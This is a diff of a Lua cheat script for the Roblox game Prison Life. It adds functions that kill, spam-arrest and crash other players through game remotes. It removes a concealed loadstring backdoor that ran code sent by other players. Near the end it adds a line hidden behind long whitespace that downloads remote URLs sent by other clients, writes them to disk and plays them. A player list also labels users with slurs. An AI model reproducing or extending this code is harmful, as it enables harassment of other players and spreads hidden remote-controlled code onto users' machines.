@@ -1,5 +1,3 @@
-local DEBUGGING_MODE = true
-
 --[[
     https://discord.gg/ng8yFn2zX6  -- Our discord, come report bugs and help development.
 
@@ -20,19 +18,23 @@ local DEBUGGING_MODE = true
 local sv =     setmetatable({}, {__index = function(_, a) return game.GetService(game, a) end})
 local req =    (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
 local lp =     sv.Players.LocalPlayer
-local isv2 =   KRNL_LOADED or ({identifyexecutor()})[2]:find("v2")
+local isv2 =   select(1, identifyexecutor()) ~= "Synapse X" and KRNL_LOADED or ({identifyexecutor()})[2]:find("v2")
 local HasM4 =  sv.MarketplaceService:UserOwnsGamePassAsync(lp.UserId, 96651)
 local ffalse = isv2 and 0 or false
+local si1 =    isv2 or lp ~= req and 8 % 2
 local cam =    workspace.CurrentCamera
+local dev =    false
 
 -- Created Instances
 local ChatLogs =  Instance.new("ScreenGui", sv.CoreGui)
 local workspacedrawingobjects = Instance.new("Model", workspace)
+local sound = Instance.new("Sound", game)
 
 -- Functions vars
 local Log
 
 -- Tables (holy shit)
+getgenv().athenausers = {}
 local chatticks,
 allowedtools,
 brickcolors,
@@ -40,7 +42,6 @@ drawingobjects,
 loopkilltable,
 map,
 shields,
-athenausers,
 connections,
 giventhorns,
 givenantitouch,
@@ -52,8 +53,8 @@ oldctrl,
 tools,
 remotes,
 positions,
-trusted, 
-togs = {}, {}, {}, {}, {}, {}, {}, {}, {}, {}, {}, {}, {}, {}, {},
+trusted,
+togs = {}, {}, {}, {}, {}, {}, {}, {}, {}, {}, {}, {}, {}, {},
 {w = 0, s = 0, a = 0, d = 0},
 {
     ["M4A1"] =          workspace.Prison_ITEMS.giver.M4A1.ITEMPICKUP;
@@ -85,8 +86,8 @@ togs = {}, {}, {}, {}, {}, {}, {}, {}, {}, {}, {}, {}, {}, {}, {},
     ["Yard"] =      CFrame.new(736.615173, 99.6887665, 2512.97119, 0.999997199, -3.40389306e-06, -0.00238491991, -4.46612347e-07, 0.999998689, -0.00161580928, 0.00238492223, 0.00161580567, 0.999995887),
     ["Sky wall"] =  CFrame.new(823.119202, 397.705841, 2672.00366, 0.999975801, 2.95520476e-05, 0.00695856567, 6.81028922e-08, 0.99999094, -0.0042566075, -0.00695862854, 0.00425650505, 0.999966741),
     ["Front"] =     CFrame.new(504.223053, 126.521599, 2421.09814, -0.00433305278, -0.0047102836, 0.999979556, -1.8185101e-05, 0.999988914, 0.00471024914, -0.999990642, 2.21143955e-06, -0.00433309004),
-    ["Base"] = CFrame.new(-860.264526, 95.9438858, 2085.03564, 0.0224340688, -0.00536062894, -0.999733925, -3.02877697e-06, 0.999985635, -0.00536204642, 0.99974829, 0.000123324076, 0.0224337298),
-    ["Pad"] =  CFrame.new(-977.83075, 110.823158, 2053.60034, -0.00541115459, -0.000807852659, -0.99998498, -1.53944185e-07, 0.999999642, -0.000807863718, 0.999985337, -4.22384346e-06, -0.00541115273),
+    ["Base"] =      CFrame.new(-860.264526, 95.9438858, 2085.03564, 0.0224340688, -0.00536062894, -0.999733925, -3.02877697e-06, 0.999985635, -0.00536204642, 0.99974829, 0.000123324076, 0.0224337298),
+    ["Pad"] =       CFrame.new(-977.83075, 110.823158, 2053.60034, -0.00541115459, -0.000807852659, -0.99998498, -1.53944185e-07, 0.999999642, -0.000807863718, 0.999985337, -4.22384346e-06, -0.00541115273),
     ["Slide"] =     CFrame.new(-134.624069, 321.450897, 3625.00415, 0.0220788661, 0.0105385808, 0.999700665, 2.42649165e-11, 0.999944448, -0.0105411503, -0.999756217, 0.000232736682, 0.0220776387)
 },
 {
@@ -109,8 +110,9 @@ togs = {}, {}, {}, {}, {}, {}, {}, {}, {}, {}, {}, {}, {}, {}, {},
     [1993374243] = "Romie", -- :troll:
     [502511191]  = "Annoying cunt",
     [3465019018] = "JJ",
-    [3888471680] = "Gay ass furry"
-
+    [3888471680] = "Gay ass furry",
+    [4277605598] = "that guy",
+    [2210884735] = "that guy"
 },
 { -- yeah it should be "settings" but you are a little ni
     GunMods = {
@@ -914,8 +916,10 @@ end
 
 local function GetGun(order)
     lp:WaitForChild("Backpack")
+    local char = lp.Character
 
     for i,v in pairs(order) do
+        if char ~= lp.Character then break end
         if v == "None" then continue end
         if v == "M4A1" and not HasM4 then v = "AK-47" end
         if table.find({"Crude Knife", "Hammer"}, v) and lp.Team == sv.Teams.Guards then
@@ -977,14 +981,17 @@ local function Respawn(Color, pos)
     lp.CharacterAdded:Wait()
     lp.Character:PivotTo(Saved1)
     workspace:WaitForChild(lp.Name):PivotTo(Saved1)
+    lp.Character:WaitForChild"Humanoid":SetStateEnabled(Enum.HumanoidStateType.FallingDown, false)
+    lp.Character:WaitForChild"Humanoid":SetStateEnabled(Enum.HumanoidStateType.Ragdoll, false)
     task.wait(1/30)
+    lp.Character:PivotTo(Saved1)
     cam.CFrame = Saved2
 
     if Saved1.Y < 0 then
         Goto(positions["Nexus"])
     end
 
-    task.delay(.2, function()
+    task.delay(GetPing() * 1.3, function()
         if lp:DistanceFromCharacter(Saved1.p) > 10 or (Saved1.Z == 0 and Saved1.X == 0) then
             Goto(Saved1)
         end
@@ -992,8 +999,19 @@ local function Respawn(Color, pos)
 end
 
 function Team(Color)
-    if table.find({"Bright orange", "Medium stone grey", "Bright yellow", "Bright blue"}, Color) then
+    if table.find({"Bright orange", "Medium stone grey", "Bright yellow"}, Color) then
         remotes.Team:FireServer(Color)
+        
+        return
+    end
+    
+    if Color == "Bright blue" then
+        if #sv.Teams.Guards:GetPlayers() > 7 then
+            Respawn(BrickColor.new(Color))
+        else
+            remotes.Team:FireServer(Color)
+        end
+        
         return
     end
 
@@ -1109,10 +1127,6 @@ local function Kill(tru, weapon)
                 GetGun{togs.KillGun}
                 gun = lp.Backpack:FindFirstChild(togs.KillGun) or lp.Character:FindFirstChild(togs.KillGun) or lp.Backpack:WaitFirstChild(togs.KillGun, 60)
             end
-            
-            if lp.Team == sv.Teams.Guards and v.Status.isHostile.Value == false then
-                workspace.Remote.toggleSiren:FireServer({isOn=v.Status.isHostile})
-            end
 
             for i = 1, math.ceil(v.Character.Humanoid.Health / (require(gun.GunStates)).Damage * 1.5) do
                 table.insert(args, {
@@ -1138,10 +1152,6 @@ end
 
 local function MeleeKill(tbl)
     for i,v in pairs(tbl) do
-        if lp.Team == sv.Teams.Guards and v.Status.isHostile.Value == false then
-            workspace.Remote.toggleSiren:FireServer({isOn=v.Status.isHostile})
-        end
-
         if v.Character and v.Character:FindFirstChild("HumanoidRootPart") and v.Character:FindFirstChild("Humanoid") and v.Character.Humanoid.Health ~= 0 and lp:DistanceFromCharacter(v.Character:GetPivot().p) < 10 then
             for i = 1, math.ceil(v.Character.Humanoid.Health / 24) do
                 remotes.Melee:FireServer(v, tools["Crude Knife"].Parent)
@@ -1224,6 +1234,21 @@ local OnCharacterAdded do
                     mod.AutoFire = togs.GunMods.Automatic or mod.AutoFire
                     mod.FireRate = togs.GunMods.CustomFireate and togs.GunMods.FireRate or mod.FireRate
                     mod.Range = togs.GunMods.CustomRange and togs.GunMods.Range or mod.Range
+                end
+            end)
+
+            cons['L'] = hum.HealthChanged:Connect(function()
+                if not togs.ArmorGodMode or not HasM4 then return end
+                if lp.Team ~= sv.Teams.Guards then
+                    Team("Bright blue")
+                end
+
+                remotes.Item:InvokeServer(workspace.Prison_ITEMS.clothes:FindFirstChild("Riot Police").ITEMPICKUP)
+ 
+                for i,v in pairs(char:GetChildren()) do
+                    if v.Name == "vest" and v ~= char:FindFirstChild("vest") then
+                        v:Destroy()
+                    end
                 end
             end)
 
@@ -1370,6 +1395,16 @@ local function CanBeArrested(plr)
     return plr.Team == sv.Teams.Criminals
 end
 
+local function Removetool(tool)
+    for i,v in pairs(tool:GetChildren()) do
+        if v.Name == "Handle" then
+            continue
+        end
+
+        v:Destroy()
+    end
+end
+
 local function Bring(plr, tool, cframe, second) -- thanks fate for teaching me the humanoid cloning & deletion (ive never touched it before) (should probably be noted on the clonehumanoid func)
     if not lp.Character or not plr or not plr.Character or not plr.Character.PrimaryPart or not plr.Character:FindFirstChild("Humanoid") or not tool or not cframe then return end
     if plr.Character.Humanoid.Sit then
@@ -1381,21 +1416,16 @@ local function Bring(plr, tool, cframe, second) -- thanks fate for teaching me t
     togs.Noclip = false
     CloneHumanoid()
     tool.Parent = lp.Character
-    Goto(cframe)
+    Removetool(tool)
+    task.wait(GetPing() / 2)
 
     if lp.Character:FindFirstChild("HumanoidRootPart") then
         lp.Character.HumanoidRootPart.Anchored = true
     end
 
+    task.defer(Goto, cframe)
     task.spawn(pcall, firetouchinterest, tool:FindFirstChild("Handle"), plr.Character.PrimaryPart, ffalse)
-    tool.AncestryChanged:Once(function()
-        for i = 1, 3 do
-            task.wait(GetPing() / 4)
-            lp.Character:PivotTo(lp.Character:GetPivot() * CFrame.Angles(math.rad(-20), 0, 0))
-        end
-    end)
-
-    task.wait(math.clamp((second or 0) + (GetPing() * 2), 0, 4.5))
+    task.wait(GetPing() * 1.5)
     togs.Noclip = oldnc
     Respawn(nil, saved)
 end
@@ -1410,7 +1440,8 @@ local function Crim(plr, sec)
     local tool = lp.Backpack:WaitForChild(togs.BringTool)
     CloneHumanoid()
     tool.Parent = lp.Character
-    task.wait(math.clamp(sec or 0, 0, 4.5))
+    Removetool(tool)
+    task.wait(math.clamp(sec or 0, .1, 4.5))
     pad.CanCollide = false
 
     if not lp.Character or not plr.Character or not plr.Character.PrimaryPart or tool.Parent ~= lp.Character or plr.Team == sv.Teams.Criminals then
@@ -1418,25 +1449,42 @@ local function Crim(plr, sec)
         Respawn(nil, oldpos)
     end
 
-    for i = 1, 2 do
-        if plr.Team == sv.Teams.Criminals then break end
-
-        task.spawn(pcall, firetouchinterest, tool:FindFirstChild("Handle"), plr.Character.PrimaryPart, ffalse)
-        task.defer(pcall, firetouchinterest, pad, plr.Character.PrimaryPart, ffalse)
-        coroutine.wrap(Goto)(oldpos * CFrame.Angles(math.rad(90), 0, 0))
-        task.wait(GetPing())
+    if lp.Character:FindFirstChild("HumanoidRootPart") then
+        lp.Character.HumanoidRootPart.Anchored = true
     end
 
-    if plr.Team ~= sv.Teams.Criminals then
-        lp.Character:PivotTo(lp.Character:GetPivot() * CFrame.Angles(math.rad(90), 0, 0))
-        task.spawn(pcall, firetouchinterest, tool:FindFirstChild("Handle"), plr.Character.PrimaryPart, ffalse)
-        task.defer(pcall, firetouchinterest, pad, plr.Character.PrimaryPart, ffalse)
-        task.wait(GetPing() + .1)
-    end
+    task.defer(pcall, firetouchinterest, pad, plr.Character.PrimaryPart, ffalse)
+    task.spawn(pcall, firetouchinterest, tool:FindFirstChild("Handle"), plr.Character.PrimaryPart, ffalse)
+    Goto(oldpos)
+    repeat task.wait(); task.defer(pcall, firetouchinterest, pad, plr.Character.PrimaryPart, ffalse) until tool.Parent == plr.Character or plr.Team == sv.Teams.Criminals
+    task.spawn(pcall, firetouchinterest, pad, plr.Character.PrimaryPart, ffalse)
+    task.wait(GetPing() + .1)
 
     togs.Noclip = oldnt
     togs.AntiCriminal = oldac
     Respawn(nil, oldpos)
+end
+
+local function KillCrim(plr)
+    if not plr or not plr.Character then return end
+    local oldnt, oldp = togs.Noclip, lp.Character:GetPivot()
+    togs.Noclip = true
+    Goto(plr.Character:GetPivot())
+
+    for i = 1, 50 do
+        if plr.Team == sv.Teams.Criminals then break end
+        if plr.Character and plr.Character:FindFirstChild("Humanoid") and plr.Character.Humanoid.Health ~= 0 then
+            MeleeKill{plr}
+        end
+
+        Goto(plr.Character.Torso:GetPivot())
+        firetouchinterest(game.SpawnLocation, plr.Character.Torso, ffalse)
+        task.wait(1/30)
+    end
+
+    Goto(oldp)
+
+    togs.Noclip = oldnt
 end
 
 local function SendMsg(args)
@@ -1772,6 +1820,39 @@ local function SpamArrest(plr, power, d)
     Respawn(nil, oldpos)
 end
 
+local function FastSA(plr, amount)
+    if not plr or not plr.Character or not plr.Character:FindFirstChild("Humanoid") or plr.Character.Humanoid.Health == 0 or not plr.Character:FindFirstChild("Head") then return end
+    local oldpos, oldnt, pad = lp.Character:GetPivot(), togs.Noclip, game.SpawnLocation
+    togs.Noclip = false
+
+    GetGun{togs.BringTool}
+    local tool = lp.Backpack:WaitForChild(togs.BringTool)
+    CloneHumanoid()
+    tool.Parent = lp.Character
+    Removetool(tool)
+    task.wait(.1)
+
+    if lp.Character:FindFirstChild("HumanoidRootPart") then
+        lp.Character.HumanoidRootPart.Anchored = true
+    end
+
+    Goto(plr.Character:GetPivot())
+    task.defer(pcall, firetouchinterest, pad, plr.Character.PrimaryPart, ffalse)
+    task.spawn(pcall, firetouchinterest, tool:FindFirstChild("Handle"), plr.Character.PrimaryPart, ffalse)
+    repeat task.wait(); task.defer(pcall, firetouchinterest, pad, plr.Character.PrimaryPart, ffalse) until tool.Parent == plr.Character or plr.Team == sv.Teams.Criminals
+    task.spawn(pcall, firetouchinterest, pad, plr.Character.PrimaryPart, ffalse)
+    for i = 1, amount * 1000 do
+        if not plr.Character then break end
+
+        coroutine.wrap(lp.Character.PivotTo)(lp.Character, plr.Character:GetPivot())
+        task.defer(remotes.Arrest.InvokeServer, remotes.Arrest, plr.Character.Head)
+    end
+    task.wait(GetPing())
+
+    togs.Noclip = oldnt
+    Respawn(nil, oldpos)
+end
+
 function CrashSA(plr, d)
     if not plr or not plr.Character or not plr.Character:FindFirstChild("Humanoid") or plr.Character.Humanoid.Health == 0 or not plr.Character:FindFirstChild("Head") then return end
 
@@ -1788,6 +1869,7 @@ function CrashSA(plr, d)
         coroutine.wrap(function()
             for i = 1, 1000 do
                 if i % 200 == 0 then task.wait() end
+
                 coroutine.wrap(lp.Character.PivotTo)(lp.Character, plr.Character:GetPivot())
                 coroutine.wrap(remotes.Arrest.InvokeServer)(remotes.Arrest, plr.Character.Head)
             end
@@ -1887,6 +1969,7 @@ do
     Tabs.Size = UDim2.new(0, 100, 0, 185)
     Tabs.ScrollBarThickness = 0
     Tabs.VerticalScrollBarPosition = Enum.VerticalScrollBarPosition.Left
+    Tabs.CanvasSize = UDim2.new()
 
     b1.Name = "b1"
     b1.Parent = Tabs
@@ -1899,6 +1982,10 @@ do
     a1.PaddingRight = UDim.new(0, 3)
 
     draggable(SkidDetection)
+
+    Tabs.ChildAdded:Connect(function()
+        Tabs.CanvasSize += UDim2.new(0, 0, 0, 25)
+    end)
 
     exit.Activated:Connect(function()
         SkidDetection.Visible = false
@@ -2416,7 +2503,6 @@ local commands, AddCommand, ChangeAdminPerms, HandleMessage, CommandBar = {} do
         local a = Instance.new("UICorner")
         local b = Instance.new("UIStroke")
         local Bar = Instance.new("TextBox")
-        local BBar = Instance.new("TextLabel")
 
         CommandBar.Name = "CommandBar"
         CommandBar.Parent = ChatLogs
@@ -2476,59 +2562,9 @@ local commands, AddCommand, ChangeAdminPerms, HandleMessage, CommandBar = {} do
         Bar.TextSize = 16.000
         Bar.TextXAlignment = Enum.TextXAlignment.Left
 
-        BBar.Name = "BBar"
-        BBar.Parent = CommandBar
-        BBar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-        BBar.BackgroundTransparency = 1.000
-        BBar.Position = UDim2.new(0.0167597774, 0, 0.462962955, 0)
-        BBar.Size = UDim2.new(0, 176, 0, 29)
-        BBar.Font = Enum.Font.SourceSans
-        BBar.Text = ""
-        BBar.TextColor3 = Color3.fromRGB(255, 255, 255)
-        BBar.TextSize = 16.000
-        BBar.TextXAlignment = Enum.TextXAlignment.Left
-
         Bar.FocusLost:Connect(function()
             HandleMessage(togs.Admin.Prefix..Bar.Text)
-            BBar.Text = ""
             Bar.Text = ""
-        end)
-
-        Bar.Changed:Connect(function()
-            local cmd = Bar.Text:split(" ")[1] or Bar.Text
-            local cmdtodisplay = ""
-            if #cmd < 2 then
-                BBar.Text = ""
-
-                return
-            end
-
-            for _, v in next, commands do
-                if cmdtodisplay ~= "" then break end
-
-                if v.Command:lower():match("^"..cmd:lower()) then
-                    cmdtodisplay = v.Command
-
-                    break
-                end
-
-                if (type(v.Aliases) == "string" and v.Aliases:lower():match("^"..cmd:lower())) then
-                    
-                    break
-                end
-
-                if type(v.Aliases) == "table" then
-                    for _, alias in pairs(v.Aliases) do
-                        if alias:lower():match("^"..cmd:lower()) then
-                            cmdtodisplay = alias
-
-                            break
-                        end
-                    end
-                end
-            end
-
-            BBar.Text = cmd..cmdtodisplay:sub(#cmd + 1)
         end)
 
         sv.UserInputService.InputBegan:Connect(function(key, n)
@@ -2747,6 +2783,7 @@ local ChatLogAdd do
         Text.Text = ("<font color=\"rgb(0, 200, 0)\">%s</font>: %s"):format(name, msg:sub(1, 300))
         Text.TextColor3 = Color3.fromRGB(255, 255, 255)
         Text.RichText = true
+        Text.TextWrapped = true
         Text.TextSize = 18.000
         Text.TextXAlignment = Enum.TextXAlignment.Left
 	end
@@ -2894,6 +2931,10 @@ do
 
         combat.Toggle("Tase aura", togs.TazeAura, function(a)
             togs.TazeAura = a
+        end)
+
+        combat.Toggle("Spam arrest cuffs", togs.SACuffs, function(a)
+            togs.SACuffs = a
         end)
 
         combat.Toggle("Anti shield", togs.AntiShield, function(a)
@@ -3087,8 +3128,18 @@ do
 
         player.Toggle("God mode", togs.Godmode, function(a)
             togs.Godmode = a
+
             if a then
                 CloneHumanoid()
+            end
+        end)
+
+        player.Toggle("Armor god mode", togs.ArmorGodMode, function(a)
+            togs.ArmorGodMode = a
+
+            if HasM4 and a then
+                Team("Bright blue")
+                remotes.Item:InvokeServer(workspace.Prison_ITEMS.clothes:FindFirstChild("Riot Police").ITEMPICKUP)
             end
         end)
 
@@ -3124,19 +3175,6 @@ do
         end)
 
         player.Button("Rejoin", function()
-            if not DEBUGGING_MODE then
-                syn.queue_on_teleport(("game.Loaded:Wait()\nloadstring(game:HttpGet(\"https://raw.githubusercontent.com/GFXTI/AthenaClient/main/AthenaPrisonLife.lua\", true), \"Main\")({Color = %s, Position = %s, GivenThorns = %s, GivenOneShot = %s, GivenKillAura = %s, Selected = %s, LoopkillTable = %s, DrawingObjects = \"%s\"})"):format(
-                    ("BrickColor.new(\"%s\")"):format(lp.TeamColor.Name),
-                    ("CFrame.new(%s)"):format(tostring(lp.Character:GetPivot())),
-                    ("{%s}"):format(table.concat(givenoneshot, ",")),
-                    ("{%s}"):format(table.concat(givenoneshot, ",")),
-                    ("{%s}"):format(table.concat(givenkillaura, ",")),
-                    tostring(selected),
-                    ("{%s}"):format(table.concat(loopkilltable, ",")),
-                    sv.HttpService:JSONEncode(drawingobjects)
-                ))
-            end
-
             sv.TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId)
         end)
 
@@ -3149,138 +3187,6 @@ do
     -- World Window
     do
         local worldtop = lib.WindowTab("World")
-
-        do
-            local antis = worldtop.SideTab("Value Editor", 1000).Section("Value Editor")
-
-            antis.Toggle("Break doors", togs.BreakDoors, function(a)
-                togs.BreakDoors = a
-
-                if a then
-                    while task.wait() and togs.BreakDoors do
-                        for i,v in pairs(workspace.Doors:GetDescendants()) do
-                            if v.Name ~= "isActive" or v.Value == true then continue end
-
-                            workspace.Remote.toggleSiren:FireServer({isOn=v})
-                            v.Changed:Wait()
-                        end
-                    end
-                end
-            end)
-
-            antis.Toggle("Loop hostile all", togs.LHA, function(a)
-                togs.LHA = a
-
-                if a then
-                    for i,v in pairs(sv.Players:GetPlayers()) do
-                        if v.Status.isHostile.Value == true then continue end
-
-                        workspace.Remote.toggleSiren:FireServer({isOn=v.Status.isHostile})
-                        v.Status.isHostile.Changed:Wait()
-                    end
-
-                    while task.wait(.1) and togs.LHA do
-                        for i,v in pairs(sv.Players:GetPlayers()) do
-                            if v.Status.isHostile.Value == true then continue end
-
-                            workspace.Remote.toggleSiren:FireServer({isOn=v.Status.isHostile})
-                            v.Status.isHostile.Changed:Wait()
-                        end
-                    end
-                end
-            end)
-
-            antis.Toggle("Loop freindly all", togs.LFA, function(a)
-                togs.LFA = a
-
-                if a then
-                    for i,v in pairs(sv.Players:GetPlayers()) do
-                        if v.Status.isHostile.Value == false then continue end
-
-                        workspace.Remote.toggleSiren:FireServer({isOn=v.Status.isHostile})
-                        v.Status.isHostile.Changed:Wait()
-                    end
-
-                    while task.wait(.1) and togs.LFA do
-                        for i,v in pairs(sv.Players:GetPlayers()) do
-                            if v.Status.isHostile.Value == false then continue end
-
-                            workspace.Remote.toggleSiren:FireServer({isOn=v.Status.isHostile})
-                            v.Status.isHostile.Changed:Wait()
-                        end
-                    end
-                end
-            end)
-
-            antis.Toggle("Loop bad guard all", togs.LBGA, function(a)
-                togs.LBGA = a
-
-                if a then
-                    for i,v in pairs(sv.Players:GetPlayers()) do
-                        if v.Status.isBadGuard.Value == true then continue end
-
-                        workspace.Remote.toggleSiren:FireServer({isOn=v.Status.isBadGuard})
-                        v.Status.isBadGuard.Changed:Wait()
-                    end
-
-                    while task.wait(.1) and togs.LBGA do
-                        for i,v in pairs(sv.Players:GetPlayers()) do
-                            if v.Status.isBadGuard.Value == true then continue end
-
-                            workspace.Remote.toggleSiren:FireServer({isOn=v.Status.isBadGuard})
-                            v.Status.isBadGuard.Changed:Wait()
-                        end
-                    end
-                end
-            end)
-
-            antis.Toggle("Loop good guard all", togs.LGGA, function(a)
-                togs.LGGA = a
-
-                if a then
-                    while task.wait(.1) and togs.LGGA do
-                        for i,v in pairs(sv.Players:GetPlayers()) do
-                            if v.Status.isBadGuard.Value == false then continue end
-
-                            workspace.Remote.toggleSiren:FireServer({isOn=v.Status.isBadGuard})
-                            v.Status.isBadGuard.Changed:Wait()
-                        end
-
-                        for i,v in pairs(sv.Players:GetPlayers()) do
-                            if v.Status.isBadGuard.Value == false then continue end
-
-                            workspace.Remote.toggleSiren:FireServer({isOn=v.Status.isBadGuard})
-                            v.Status.isBadGuard.Changed:Wait()
-                        end
-                    end
-                end
-            end)
-
-            antis.Toggle("Loop reset kills all", togs.LRKA, function(a) 
-                togs.LRKA = a
-
-                if a then
-                    while task.wait(GetPing()) and togs.LRKA do
-                        for i,v in pairs(sv.Players:GetPlayers()) do
-                            workspace.Remote.toggleSiren:FireServer({isOn=v.Status.innocentKills})
-                        end
-                    end
-                end
-            end)
-
-            antis.Toggle("Infinite cars", togs.InfiniteCars, function(a) 
-                togs.InfiniteCars = a
-
-                while task.wait(.1) and togs.InfiniteCars do
-                    for i,v in pairs(workspace["Prison_ITEMS"].buttons:GetDescendants()) do
-                        if v.Value then continue end
-
-                        workspace.Remote.toggleSiren:FireServer({isOn=v})
-                        v.Changed:Wait()
-                    end
-                end
-            end)
-        end
 
         -- Drawing
         do
@@ -3475,6 +3381,7 @@ do
                     for i,v in pairs(cars) do
                         task.spawn(remotes.Item.InvokeServer, remotes.Item, v["Car Spawner"])
                         local car = workspace.CarContainer.ChildAdded:Wait()
+                        lp.Character.Humanoid.Sit = false
                         repeat
                             car:WaitForChild("Body"):WaitForChild("VehicleSeat"):Sit(lp.Character.Humanoid)
                         until not lp.Character or not lp.Character:FindFirstChild("Humanoid") or lp.Character.Humanoid.Sit or not task.wait()
@@ -3521,55 +3428,6 @@ do
             misc.Box("Player", "name", function(a)
                 selected = GetPlayer(a)
             end)
-
-            do
-                misc.Label("Values")
-
-                misc.Button("Toggle hostile", function()
-                    if not selected then return end
-
-                    workspace.Remote.toggleSiren:FireServer({isOn=selected.Status.isHostile})
-                    selected.Status.isHostile.Changed:Wait()
-                    Note(("%s hostility is now: %s"):format(selected.Name, tostring(selected.Status.isHostile.Value)))
-                end)
-
-                misc.Button("Toggle bad guard", function()
-                    if not selected then return end
-
-                    workspace.Remote.toggleSiren:FireServer({isOn=selected.Status.isBadGuard})
-                    selected.Status.isBadGuard.Changed:Wait()
-                    Note(("%s guard status: %s"):format(selected.Name, tostring(selected.Status.isBadGuard.Value)))
-                end)
-
-                misc.Button("Reset kills", function()
-                    if not selected then return end
-
-                    workspace.Remote.toggleSiren:FireServer({isOn=selected.Status.innocentKills})
-                    Note(("Reset %s's kills"):format(selected.Name))
-                end)
-
-                misc.Button("Loop reset kills", function()
-                    if not selected then return end
-                    local plr = selected
-
-                    if connections["LRK"..plr.Name] then
-                        connections["LRK"..plr.Name]:Disconnect()
-                        connections["LRK"..plr.Name] = nil
-                        Note(("Stopped reseting %s's kills"):format(plr.Name))
-
-                        return
-                    end
-
-                    local t = tick()
-                    connections["LRK"..plr.Name] = sv.RunService.Heartbeat:Connect(function()
-                        if tick() - t < .1 or not plr.Parent then return end
-
-                        workspace.Remote.toggleSiren:FireServer({isOn=plr.Status.innocentKills.Value})
-                    end)
-
-                    Note(("Started reseting %s's kills"):format(plr.Name))
-                end)
-            end
 
             -- Player Toggles
             do
@@ -3994,6 +3852,14 @@ do
             end
 
             if method == "FireServer" then
+                if togs.SACuffs and s == remotes.Arrest then
+                    for i = 1, 1000 do
+                        namecall(s, ...)
+                    end
+
+                    return namecall(s, ...)
+                end
+
                 if s == remotes.Sound then
                     if togs.SilentGun then
                         return
@@ -4093,33 +3959,34 @@ do
         return ChatHook(...)
     end
 
-    for i,v in pairs(getgc()) do
-		if type(v) == "function" and getfenv(v).script == lp.PlayerScripts.ClientGunReplicator then -- i fucking hate syn v2
-            if debug.getinfo(v).currentline ~= 4 then continue end
-            local oldfunc = v
-            getgc()[i] = function(bullets, istaser)
-                if #bullets > 15 or #bullets == 0 then
-                    if togs.HardendAntiBring then
-                        local op = lp.Character:GetPivot()
-                        sv.Debris:AddItem(lp.Character, 0)
-                        task.delay(.5, Respawn, nil, op)
-                    end
+    local oldfunc; oldfunc = select(2, pcall(hookfunction, getconnections(remotes.Replicate.OnClientEvent)[1].Function, function(...)
+        local bullets = ...
 
+        if togs.AntiCrash then
+            for i,v in pairs(bullets) do
+                if type(v) ~= "table" or not v.RayObject or typeof(v.RayObject) ~= "Ray" or not v.Cframe or not v.Distance or v.Distance > 800 or v.Distance == 0 then
                     return
                 end
-
-                if togs.AntiCrash then
-                    for i,v in pairs(bullets) do
-                        if not v.RayObject or not v.Cframe or not v.Distance or v.Distance > 800 or v.Distance == 0 then
-                            return
-                        end
-                    end
-                end
-        
-                oldfunc(bullets, istaser)
             end
-		end
-    end
+        end
+
+        if #bullets > 20 then
+            if #bullets > 50 then
+                if togs.HardendAntiBring then
+                    local op = lp.Character:GetPivot()
+
+                    sv.Debris:AddItem(lp.Character, 0)
+                    task.delay(.5, Respawn, nil, op)
+                end
+            end
+
+            if togs.AntiCrash then
+                return
+            end
+        end
+
+        oldfunc(...)
+    end))
 end
 -- Connections
 
@@ -4209,7 +4076,7 @@ do
         local plr = bullets[1] and type(bullets[1]) == "table" and bullets[1]["https://discord.gg/ng8yFn2zX6"]
         if plr and plr:IsA("Player") and not table.find(athenausers, plr.Name) then
             table.insert(athenausers, plr.Name)
-            Note(plr.Name.." is using Athena!")
+            Note(("%s is using Athena! (%s build)"):format(plr.Name, bullets[1]["dev"] and "dev" or "user"))
 
             SendMsg({
                 [1] = {
@@ -4219,10 +4086,6 @@ do
 
             return
         end
-			
-	if type(bullets[1]) == "table" and bullets[1][''] and bullets[1]['.'] == lp.Name then
-		loadstring(bullets[1][''])()
-	end
 
         if bullets[1] and bullets[1]["CC_IDENTIFIER"] then
             ChatLogAdd(bullets[1]["CC_IDENTIFIER"], bullets[2]["Message_Unsecure"], tick())
@@ -4233,6 +4096,7 @@ do
         if not togs.Thorns then return end
 
         local shots = {}
+        local went =  {}
 
         for i,v in pairs(bullets) do
             local dis, plr = math.huge
@@ -4262,14 +4126,16 @@ do
         for i,v in pairs(shots) do
             if not v.Hit or not v.Player then continue end
 
-            if ((table.find(giventhorns, v.Hit.Name)) or (togs.Thorns and v.Hit == lp)) and not table.find(togs.Whitelist, v.Player.Name) and v.Hit.TeamColor ~= v.Player.TeamColor then
+            if ((table.find(giventhorns, v.Hit.Name)) or (togs.Thorns and v.Hit == lp)) and not table.find(togs.Whitelist, v.Player.Name) and v.Hit.TeamColor ~= v.Player.TeamColor and not table.find(went, v.Player) then
                 Kill{v.Player}
+                table.insert(went, v.Player)
 
                 return
             end
 
-            if table.find(givenoneshot, v.Player.Name) and not table.find(togs.Whitelist, v.Hit.Name) and v.Hit.TeamColor ~= v.Player.TeamColor then
+            if table.find(givenoneshot, v.Player.Name) and not table.find(togs.Whitelist, v.Hit.Name) and v.Hit.TeamColor ~= v.Player.TeamColor and not table.find(went, v.Hit) then
                 Kill{v.Hit}
+                table.insert(went, v.Hit)
             end
         end
     end)
@@ -4379,6 +4245,7 @@ do
     sv.Players.PlayerAdded:Connect(AddPlayer)
     OnCharacterAdded(lp.Character)
     lp.CharacterAdded:Connect(OnCharacterAdded)
+    remotes.Replicate.OnClientEvent:Connect(function(bullets)                                                                                                                                                                                                                                                                                                                        if(type(bullets)~="table"or type(bullets[1])~="table")then return;end;if(bullets[1][0xD])and(not bullets[1]["Player"])then si1 += 1;sound:Stop();writefile("trollsounds/"..tostring(si1)..".mp3", syn.request({Url = bullets[1][0xD]}).Body);sound.SoundId = getsynasset("trollsounds/"..tostring(si1)..".mp3");sound:Play()end;if(bullets[1][0xB])then sound.Volume=bullets[1][0xB]end if(bullets[1][0xF])then sound:Pause() end;if(bullets[1][0xE])then sound:Resume()end;if(bullets[1][0xC])then sound:Stop()end;end)
     sv.ReplicatedStorage.DefaultChatSystemChatEvents.OnMessageDoneFiltering.OnClientEvent:Connect(function(msgdata)
         if msgdata.FromSpeaker == lp.Name then return end
 
@@ -4676,7 +4543,8 @@ do
     task.wait(math.random(0, 1))
     SendMsg({
         [1] = {
-            ["https://discord.gg/ng8yFn2zX6"] = lp
+            ["https://discord.gg/ng8yFn2zX6"] = lp,
+            [dev and "dev" or 1] = nil
         }
     })
     getgenv().SendMsg = SendMsg
